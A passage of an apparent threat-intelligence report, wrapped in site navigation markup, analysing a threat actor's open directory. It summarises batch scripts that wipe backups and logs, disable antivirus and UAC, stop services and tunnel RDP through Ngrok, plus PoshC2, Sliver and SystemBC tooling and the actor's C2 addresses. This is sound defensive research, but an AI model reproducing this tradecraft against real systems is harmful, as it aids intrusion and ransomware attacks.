+		<li role="menuitem" id="menu-item-49824" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/collaboration/" tabindex="0"><span class="avia-menu-text">Collaboration</span></a></li>
+		<li role="menuitem" id="menu-item-959" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/careers/" tabindex="0"><span class="avia-menu-text">Careers</span></a></li>
+	</ul>
+</li>
+</ul>
+
+</div>
+</li>
+<li role="menuitem" id="menu-item-958" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-mega-parent  menu-item-top-level menu-item-top-level-5"><a class="menu-item-inner" href="https://thedfirreport.com/company/analysts/" tabindex="0"><span class="avia-menu-text">Analysts</span></a></li>
+</ul></div>		</div>
+		<div class="secondary-menu">
+			<div class="menu-secondary-menu-container"><ul id="menu-secondary-menu" class="secondary-menu" role="menu"><li role="menuitem" id="menu-item-337" class="menu-button gray-color menu-item menu-item-type-custom menu-item-object-custom av-menu-button av-menu-button-colored menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://dfirlabs.thedfirreport.com/auth/login" tabindex="0"><span class="avia-menu-text">Access DFIR Labs</span></a></li>
+<li role="menuitem" id="menu-item-49282" class="menu-button new-tab menu-item menu-item-type-post_type menu-item-object-page av-menu-button av-menu-button-colored menu-item-top-level menu-item-top-level-2"><a class="menu-item-inner" href="https://thedfirreport.com/company/contact-us/" tabindex="0"><span class="avia-menu-text">Get in Touch</span></a></li>
+</ul></div>		</div>
+		<button class="hamburger-toggle" aria-label="Mobile Menu Toggle">
+			<div class="burger-box"></div>
+		</button>
+	</div>
+	<div class="hamburger-overlay"></div>
+	<div class="hamburger-content">
+		<div class="hamburger-content-inner">
+		    <div class="menu-burger-menu-container"><ul id="menu-burger-menu" class="main-menu" role="menu"><li role="menuitem" id="menu-item-49255" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://thedfirreport.com/reports/" tabindex="0"><span class="avia-menu-text">Public Reports</span></a></li>
+<li role="menuitem" id="menu-item-49078" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-2"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Products</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49284" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/" tabindex="0"><span class="avia-menu-text">Products Overview</span></a></li>
+	<li role="menuitem" id="menu-item-49080" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Threat Intel</span></span>
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49287" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/" tabindex="0"><span class="avia-menu-text">Threat intel Overview</span></a></li>
+		<li role="menuitem" id="menu-item-49371" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-feed/" tabindex="0"><span class="avia-menu-text">Threat Feed</span></a></li>
+		<li role="menuitem" id="menu-item-49288" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/private-dfir-reports/" tabindex="0"><span class="avia-menu-text">Private DFIR Reports</span></a></li>
+		<li role="menuitem" id="menu-item-49289" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/all-intel/" tabindex="0"><span class="avia-menu-text">All Intel</span></a></li>
+		<li role="menuitem" id="menu-item-49290" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/active-defense/" tabindex="0"><span class="avia-menu-text">Active Defense</span></a></li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49293" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/dfir-labs/" tabindex="0"><span class="avia-menu-text">DFIR Labs</span></a></li>
+	<li role="menuitem" id="menu-item-49291" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/case-artifacts/" tabindex="0"><span class="avia-menu-text">Case Artifacts</span></a></li>
+	<li role="menuitem" id="menu-item-49292" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/detection-pack/" tabindex="0"><span class="avia-menu-text">Detection Pack</span></a></li>
+	<li role="menuitem" id="menu-item-49310" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/ai-training-ground/" tabindex="0"><span class="avia-menu-text">AI Training Ground</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-49090" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-3"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Services</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49304" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/" tabindex="0"><span class="avia-menu-text">Service Overview</span></a></li>
+	<li role="menuitem" id="menu-item-49309" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://thedfirreport.com/services/training/" tabindex="0"><span class="avia-menu-text">Training</span></a>
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49311" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/training/threat-hunting/" tabindex="0"><span class="avia-menu-text">Threat Hunting</span></a></li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49305" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/" tabindex="0"><span class="avia-menu-text">Professional Services</span></a>
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49308" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/integration/" tabindex="0"><span class="avia-menu-text">Integration</span></a></li>
+		<li role="menuitem" id="menu-item-49306" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/cti-program-advisory/" tabindex="0"><span class="avia-menu-text">CTI Program Advisory</span></a></li>
+		<li role="menuitem" id="menu-item-49307" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/incident-response-playbook/" tabindex="0"><span class="avia-menu-text">Incident Response Playbook</span></a></li>
+	</ul>
+</li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-49094" class="menu-title menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-top-level menu-item-top-level-4"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Company</span></span>
+
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49298" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/" tabindex="0"><span class="avia-menu-text">Company Overview</span></a></li>
+	<li role="menuitem" id="menu-item-49299" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/about-us/" tabindex="0"><span class="avia-menu-text">About us</span></a></li>
+	<li role="menuitem" id="menu-item-49302" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/contact-us/" tabindex="0"><span class="avia-menu-text">Contact Us</span></a></li>
+	<li role="menuitem" id="menu-item-49301" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/careers/" tabindex="0"><span class="avia-menu-text">Careers</span></a></li>
+</ul>
+</li>
+<li role="menuitem" id="menu-item-49097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-mega-parent  menu-item-top-level menu-item-top-level-5"><a class="menu-item-inner" href="/company/analysts/" tabindex="0"><span class="avia-menu-text">Analyst</span></a></li>
+<li role="menuitem" id="menu-item-49265" class="featured-post menu-item menu-item-type-post_type menu-item-object-post menu-item-top-level menu-item-top-level-6"><a class="menu-item-inner" href="https://thedfirreport.com/2023/12/04/sql-brute-force-leads-to-bluesky-ransomware/" tabindex="0"><span class="avia-menu-text">SQL Brute Force Leads to BlueSky Ransomware</span></a></li>
+<li role="menuitem" id="menu-item-49266" class="featured-post menu-item menu-item-type-post_type menu-item-object-post menu-item-top-level menu-item-top-level-7"><a class="menu-item-inner" href="https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/" tabindex="0"><span class="avia-menu-text">From OneNote to RansomNote: An Ice Cold Intrusion</span></a></li>
+</ul></div>		</div>
+	</div>
+</div>
+	<div id='main' class='all_colors' data-scroll-offset='88'>
+
+	
+<div class="single-content-section section--table-of-content avia-section main_color avia-section-default avia-no-border-styling container_wrap fullsize avia-builder-el-0 avia-builder-el-first">
+	<div class="container">
+		<div class="content">
+			<div class="entry-content-wrapper">
+				
+				<!-- Header Section -->
+				<div class="single-post-header">
+											<div class="single-post-thumbnail"><img width="2560" height="1554" src="https://thedfirreport.com/wp-content/uploads/26297_011-scaled.png" class="wp-image-48784 avia-img-lazy-loading-48784 attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" /></div>
+					
+					<div class="single-post-header-content">
+						<div class="single-post-header-content-overlay"></div>
+						<div class='ep-post-terms'><a class='ep-item-term ep-item-term-opendir' href='https://thedfirreport.com/category/opendir/' >opendir</a></div>						<h1 class="entry-title">Threat Actors' Toolkit: Leveraging Sliver, PoshC2 &#038; Batch Scripts</h1>						<div class="single-post-meta">
+														<div class="single-post-date">
+								August 12, 2024							</div>
+						</div>
+					</div>
+				</div>
+
+				<!-- Main Content with Sidebar -->
+				<div class="glossary-columns">
+					
+					<!-- Sidebar Column -->
+					<div class="sidebar-container">
+						<div class="sidebar-inner inner-toc">
+							<!-- TOC will be generated here by JavaScript -->
+						</div>
+					</div>
+
+					<!-- Content Column -->
+					<div class="content-column">
+						
+<h2 class="wp-block-heading">Key Takeaways</h2>
+
+
+
+<ul class="wp-block-list">
+<li>In early December of 2023, we discovered an open directory filled with batch scripts, primarily designed for defense evasion and executing command and control payloads. These scripts execute various actions, including disabling antivirus processes and stopping services related to SQL, Hyper-V, security tools, and Exchange servers.</li>
+
+
+
+<li>This report also highlights scripts responsible for erasing backups, wiping event logs, and managing the installation or removal of remote monitoring tools like Atera.</li>
+
+
+
+<li>Our investigation uncovered the use of additional tools, including Ngrok for proxy services, SystemBC, and two well-known command and control frameworks: Sliver and PoshC2.</li>
+
+
+
+<li>The observed servers show long term usage by the threat actors, appearing in The DFIR Report Threat Feeds as far back as September 2023. They have been active intermittently since then, with the most recent activity detected in August 2024.</li>
+<li>Ten new sigma rules were created from this report and added to our private sigma ruleset</li>
+</ul>
+<p>An audio version of this report can be found on <a href="https://podcasters.spotify.com/pod/show/the-dfir-report/" target="_blank" rel="noopener">Spotify</a>, <a href="https://podcasts.apple.com/us/podcast/reports/id1728699064" target="_blank" rel="noopener">Apple</a>, <a href="https://www.youtube.com/@TheDFIRReport/videos" target="_blank" rel="noopener">YouTube</a>, <a href="https://www.audible.com/pd/Reports-Podcast/B0CSZBRCFX?action_code=ASSGB149080119000H&amp;share_location=pdp" target="_blank" rel="noopener">Audible</a>, &amp; <a href="https://music.amazon.com/podcasts/c4fe897d-a4b4-4ceb-908d-d1a78af8cb6d/reports" target="_blank" rel="noopener">Amazon</a>.</p>
+
+
+
+<h2 class="wp-block-heading">The DFIR Report Services</h2>
+
+
+
+<ul class="wp-block-list">
+<li><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noreferrer noopener">Private Threat Briefs</a>: Over 20 private DFIR reports annually.</li>
+
+
+
+<li><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noreferrer noopener">Threat Feed</a>: Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>
+
+
+
+<li><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noreferrer noopener">All Intel</a>: Includes everything from Private Threat Briefs and Threat Feed, plus private events, opendir reports, long-term tracking, data clustering, and other curated intel.</li>
+
+
+
+<li><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noreferrer noopener">Private Sigma Ruleset</a>: Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>
+
+
+
+<li><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>: Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="https://thedfirreport.com/contact/" target="_blank" rel="noreferrer noopener">Contact us</a> today for pricing or a demo!</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Table of Contents:</strong></p>
+
+
+
+<ul>
+<li><a href="/#summary">Summary</a></li>
+<li><a href="/#analysts">Analysts</a></li>
+<li><a href="/#adversary">Adversary</a></li>
+<li><a href="/#infrastructure">Infrastructure</a></li>
+<li><a href="/#capability">Capability</a></li>
+<li><a href="/#victim">Victim</a></li>
+<li><a href="/#iocs">Indicators</a></li>
+</ul>
+
+
+
+
+
+<h2 id="summary" class="wp-block-heading"><a href="/#summary">Summary</a></h2>
+
+
+
+<p class="wp-block-paragraph">In this report, we delve into an open directory on 94.198.53.143, first observed on December 10, 2023, during our intelligence collection process. Prior to the open directory appearing, this address had appeared in our threat intelligence feeds for PoshC2 command and control. It first appeared on September 21, 2023 and has been intermittently active, most recently on August 11, 2024, showing that the infrastructure is being utilized over a long timeframe.</p>
+
+
+
+<p class="wp-block-paragraph">Besides PoshC2, the threat actor identified utilized a range of batch scripts and malware to compromise both Windows and Linux systems. Their toolkit featured scripts such as atera_del.bat and atera_del2.bat to remove Atera agents, backup.bat and delbackup.bat to delete system backups and shadow copies, and clearlog.bat to erase Windows event logs and associated data.</p>
+
+
+
+<p class="wp-block-paragraph">The actor employed cmd.cmd to disable User Account Control and modify registry settings, while scripts like def1.bat and defendermalwar.bat are used to disable Windows Defender, scheduled tasks, and uninstall Malwarebytes. They also utilized tools such as Ngrok for proxy purposes, Posh_v2_dropper_x64.exe for PowerShell-based command-and-control operations, and VmManagedSetup.exe, which contains SystemBC malware.</p>
+
+
+
+<p class="wp-block-paragraph">The threat actor further disrupted systems by stopping and disabling various critical services, using scripts like disable.bat and hyp.bat, and logging off user sessions with LOGOFALL.bat and LOGOFALL1.bat. Their overarching goal appeared to be system compromise, data destruction, and evasion of detection mechanisms.</p>
+
+
+
+<p class="wp-block-paragraph">During our investigation, we pivoted using Shodan and identified the name &#8216;PoshC2&#8217; linked to port 443 among the open ports. Further exploration using the HTTP HTML hash filter (http.html_hash:-1700067737) revealed a second IP address, 185.234.216.64:8000, with another open directory containing binaries closely matching those found at the first IP address.</p>
+
+
+
+<p class="wp-block-paragraph">Within the second open directory at 185.234.216.64:8000, we discovered a text file named poshc2+user.txt that outlined the creation of a user account by misspelling &#8216;WDAGUtilityAccount&#8217; as &#8216;WDAGUtilltyAccount&#8217;. The script also included instructions for downloading the .MSI version of the Atera Agent using the email &#8216;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="21454055484d5340464f4061464c40484d0f424e4c">[email&#160;protected]</a>&#8217;.</p>
+
+
+
+<p class="wp-block-paragraph">Although the open directory at 94.198.53.143:8000, located in Russia, has been taken down, various security vendors, including the DFIR Report, continue flagging this IP for PoshC2 activity. As of August 11, 2024, the second IP, 185.234.216.64:8000, remains accessible, indicating the threat actor&#8217;s continued use of this directory to host malicious batch scripts and binaries, leveraging PoshC2 and Sliver as their primary command-and-control tool kits.</p>
+
+
+
+<p class="wp-block-paragraph">Compared to our last <a href="https://thedfirreport.com/2023/12/18/lets-opendir-some-presents-an-analysis-of-a-persistent-actors-activity/" target="_blank" rel="noreferrer noopener">open directory report</a>, no data was present to indicate victims or targeting information. However, based on the tools presented we can conclude with medium confidence that these servers were used in ransomware intrusion activity&#8211;seeing many scripts looking to kill or stop services, delete backups and shadow copies, and disable or remove antivirus software.</p>
+
+
+
+<h2 id="analysts" class="wp-block-heading"><a href="/#analysts">Analysts</a></h2>
+
+
+
+<p class="wp-block-paragraph">Analysis and reporting completed by <a href="https://twitter.com/r3nzsec" target="_blank" rel="noreferrer noopener">r3nzsec</a>, <a href="https://x.com/0xtornado" target="_blank" rel="noopener">0xtornado</a> &amp; <a href="https://twitter.com/0xThiebaut" target="_blank" rel="noreferrer noopener">0xThiebaut</a></p>
+
+
+
+<h2 id="adversary" class="wp-block-heading"><a href="/#adversary">Adversary</a></h2>
+
+
+
+<p class="wp-block-paragraph">In the second open directory discovered via pivoting techniques, we observed a text file named ‘poshc2+user.txt’. This file detailed the creation of a user account, masquerading as the default Windows account ‘WDAGUtilityAccount’ but with an extra ‘l’, becoming ‘WDAGUtilltyAccount’. The script also included instructions to download the .MSI version of the Atera Agent using curl and a login of ‘<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e68287928f8a9487818887a6818b878f8ac885898b">[email&#160;protected]</a>’, which appears to be a legitimate email address associated with an Atera Agent account.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_001_1.png"><img decoding="async" class="aligncenter size-full wp-image-37201" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_001_1.png" alt="" width="3170" height="1522" /></a></p>
+
+
+
+
+
+<h2 id="infrastructure" class="wp-block-heading"><a href="/#infrastructure">Infrastructure</a></h2>
+
+
+
+<p class="wp-block-paragraph">During our analysis of the IP address hosting the open directory, 94.198.53.143, we found it associated with PoshC2. Using external data sources like VirusTotal revealed several connections, including file communications, downloads, URLs, and notably, collections of Command and Control (C2) frameworks. As illustrated in the screenshot provided, this IP address was linked to two distinct C2 frameworks: &#8216;PoshC2&#8217; and &#8216;Sliver&#8217;. These two command &amp; control (C2) frameworks are available for download on GitHub and are commonly utilized by penetration testers and red team professionals as part of their assessments and simulations.</p>
+
+
+
+<ul class="wp-block-list">
+<li>Posh C2 &#8211; <a href="https://github.com/nettitude/PoshC2" target="_blank" rel="noreferrer noopener">https://github.com/nettitude/PoshC2</a></li>
+
+
+
+<li>Sliver &#8211; <a href="https://github.com/BishopFox/sliver" target="_blank" rel="noreferrer noopener">https://github.com/BishopFox/sliver</a></li>
+</ul>
+
+
+
+<p class="wp-block-paragraph">However, we have also observed that these two opensource tools are being used by threat actors.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_002.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37133" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_002.png" alt="" width="2596" height="1764" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">We then proceeded to dig deeper into the open directory IP (94.198.53.143) using Shodan, to look around and see if we could find useful pivots, and additional information. A quick look into the information below, shows that this IP had multiple open ports: 80, 123, 443, 1337, 8000, 8443</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_003.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37134" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_003.png" alt="" width="3182" height="1846" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">Scrolling down the list of open ports, we noticed the name &#8220;PoshC2&#8221; associated with port 443. As this looked to be of interest in our investigation, we looked into the http html hash &#8220;http.html_hash:-1700067737&#8221; and used this as a new query to look around.</p>
+
+
+
+<figure class="wp-block-image"></figure>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37135" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_004.png" alt="" width="1480" height="1258" /></a></p>
+
+
+
+<p class="wp-block-paragraph">Upon searching for that http.html_hash, we found another IP 185.234.216.64.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37136" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_005.png" alt="" width="3112" height="1964" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">This IP (185.234.216.64) was also based in Moscow, Russia, with 3 open ports: 123, 443, and 8000.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37137" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_006.png" alt="" width="3170" height="1894" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">Checking out the open ports, we observed that port 8000 had an HTTP status code of 200, which hinted that this might still be active and accessible.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37138" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_007.png" alt="" width="1472" height="634" /></a></figure>
+
+
+
+<p class="wp-block-paragraph">Upon further investigation, we discovered another active PoshC2 open directory with nearly identical batch and executable files to those found on the initial PoshC2 IP. This discovery was made through a simple pivot in Shodan. We retrieved files from this new open directory (185.234.216.64:8000) on two occasions: March 1, 2024, and June 29, 2024. Notably, the latest retrieval contained more files than the first one. However, the most interesting part of the March version of the open directory was the ‘poschc2+user.txt’ file, which we managed to retrieve before it was deleted by the threat actor.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37139" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_008.png" alt="" width="1912" height="1168" /></a></p>
+
+
+
+
+
+<h3 class="wp-block-heading">The DFIR Report Threat Feed Data</h3>
+
+
+
+<p class="wp-block-paragraph">The DFIR Report threat intelligence team has been monitoring these IP addresses for their involvement in various command and control frameworks for our <a href="https://thedfirreport.com/services/threat-intelligence/" target="_blank" rel="noopener">Threat Feeds</a>, prior to our investigation into the open directory.</p>
+
+
+
+<p class="wp-block-paragraph">The IP address 94.198.53.143 was first detected on September 21, 2023, and has since shown intermittent activity. It has been primarily associated with PoshC2 and Sliver, with a single instance linked to Empire. The infrastructure&#8217;s use of different command and control frameworks is sporadic, but it is regularly reactivated, with the most recent activity occurring in August 2024.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37140" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_009.png" alt="" width="1910" height="410" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">The IP address 185.234.216.64 has been exclusively associated with PoshC2 activity. It has been intermittently used from October 2023 through August 2024.</p>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37141" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_010.png" alt="" width="1909" height="411" /></a></p>
+<p>&nbsp;</p>
+
+
+
+
+
+<h2 id="capability" class="wp-block-heading"><a href="/#capability">Capabilities</a></h2>
+<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37142" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_011.png" alt="" width="4903" height="2977" /></a></p>
+
+
+
+
+
+<p class="wp-block-paragraph">This next section will cover the different tools/scripts in the open directory. Below is a short summary of each of the files, which we will then cover in more detail.</p>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c01"><strong>atera_del.bat/atera_del2.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script is for removing Atera remote management agent.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c02"><strong>backup.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script is used to delete all system state and general backups, remove all shadow copies, and ignore all boot failures.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c03"><strong>clearlog.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script to delete Windows event logs that also delete recycle bin and registry keys related to terminal server client.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c04"><strong>cmd.cmd</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This file disables UAC, modifies registry settings, including RDP settings.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c05"><strong>def1.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script disables Windows Defender and scheduled tasks.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c06"><strong>defendermalwar.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script disables Windows Defender, altering user account control settings and uninstalling Malwarebytes.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c07"><strong>delbackup.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script, which deletes all system state backups, backup catalogs, shadow copies, and alters boot configuration setting to ignore failures.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c08"><strong>disable.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script stops and disables services related to Microsoft SQL &amp; Exchange, various database services, and additional system services on a Windows server/workstation.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c09"><strong>hyp.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script deletes various Hyper-V, SQL, and Firebird server services. It also stops a wide range of system and third-party services in Windows machines.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c10"><strong>LOGOFALL.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script lists all user sessions, and logs off each session except the first one.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c11"><strong>LOGOFALL1.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script attempts to log off all sessions up to the 20th session, excluding the user&#8217;s current session.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c12"><strong>NG1.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script contains a Ngrok authentication token that runs on port 3389 (RDP).</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c13"><strong>NG2.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script that contains a Ngrok authentication token that runs in the same port, 3389 (RDP).</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c14"><strong>Ngrok.exe</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This is a legitimate tool, which can, and was, abused for proxy purposes.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c15"><strong>ON.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script to ensure that the network services are running and set to start automatically.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c16"><strong>Posh_v2_dropper_x64.exe</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>The PoshC2 dropper, a PowerShell-based C2 executable.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c17"><strong>native_dropper</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>The Linux version of Posh_v2_dropper_x64.exe.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c18"><strong>poshc2+user.txt</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>The text file with PowerShell one-liners to execute PoshC2 agent and perform further post-exploitation actions.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c19"><strong>py_dropper.sh</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>Bash shell script to execute a python dropper for PoshC2.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c20"><strong>Setup_uncnow.msi</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>Atera remote admin tool installer.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><strong><a href="/#c21">shadow.bat</a>/<a href="/#c22">shadowGuru.bat</a></strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script consists of multiple registry key deletions pertaining to security tools, including the creation of network shares for multiple disk drives while granting full access permissions to everyone.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c23"><strong>VmManagedSetup.exe</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>SystemBC malware executable.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c24"><strong>WILD_PRIDE.exe</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>Sliver C2 framework executable.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c25"><strong>z.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>This batch script is to remove services and processes associated with Hyper-V, multiple AV programs, SQL, and other specific services.</li>
+</ul>
+
+
+
+<p class="wp-block-paragraph"><a href="/#c26"><strong>z1.bat</strong></a></p>
+
+
+
+<ul class="wp-block-list">
+<li>Huge scripts to automate the disabling of processes, services, registry modification, and a lot of defense evasion techniques.</li>
+</ul>
+
+
+
